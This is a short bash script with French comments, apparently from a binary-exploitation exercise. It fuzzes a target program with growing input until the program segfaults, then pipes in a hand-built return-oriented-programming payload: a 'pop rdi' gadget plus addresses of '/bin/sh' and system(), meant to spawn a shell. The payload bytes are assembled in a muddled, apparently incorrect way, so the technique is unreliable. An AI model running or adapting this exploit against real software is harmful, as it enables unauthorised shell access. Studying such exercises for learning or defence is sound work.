#!/bin/bash
a="a"
result=0
count=1
b=""
while (($result==0))
do
        b+="b"
        a+="a"
        count=$(($count+1))
        echo $a|./$1 > /tmp/test
        result=$(echo $?)
done

clear
echo "Execution de $0 terminé avec votre programme $1"
echo "Le script accepte jusque $count caractere avant detre en segfault !"
echo "Variable testé qui a segfault                    = $a ( soit $(($count+1)) a )"
echo "Variable testé (juste avant ) qui a pas segfault = $b  ( soit $(($count)) b )"

echo "tentative de lancement de BinSh puis de System : "
#echo -en $b"\x8F\x05\x00\x00\x00\x00\xf7\xa5\x19\xe3\xd9\xc0\xC3"|./$1
echo "pop rdi depuis ropper : 0x00000000004005c3: pop rdi; ret;  "
echo "f7a519 #bin sh en reverse ça fait :  19a5f7"
echo "e3d9c0 #system en reverse ça fait : c0e3d9"
echo "donc on va mettre au milieu nos adresses de bin sh et system, soit :"
echo "400519a5f7c0e3d9c3"
echo -en $b"\x40\x05\x19\xa5\xf7\xc0\xe3\xd9\xc3"|./$1


# systme :  <system> 0x74006d6574737973 ('system')
# binsh :   0x650068732f6e6962 ('bin/sh')

#pop rdi depuis ropper :
#0x00000000004005c3: pop rdi; ret; 
#donc on va mettre au milieu nos adresses de bin sh et system, soit :
#400519a5f7c0e3d9c3


#8F0500000000 #pop rdSi
#f7a519 #bin sh en reverse ça fait :  19a5f7
#e3d9c0 #system en reverse ça fait : c0e3d9
#C3 #ret
#
## soit :
#8F0500000000f7a519e3d9c0C3
